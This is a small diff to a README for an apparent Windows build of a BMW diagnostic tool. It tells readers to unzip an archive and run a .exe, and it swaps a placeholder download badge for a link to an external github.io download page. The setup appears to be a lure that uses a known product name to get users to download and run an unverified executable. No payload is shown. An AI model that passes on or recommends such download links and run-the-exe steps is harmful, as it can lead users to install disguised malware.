@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://bimmerlink-windows-download.github.io/.github/)
 
 ## ⚡ Key Features
 ⚡ **BimmerLink Diagnostic Tool for BMW** – read and clear fault codes instantly.  
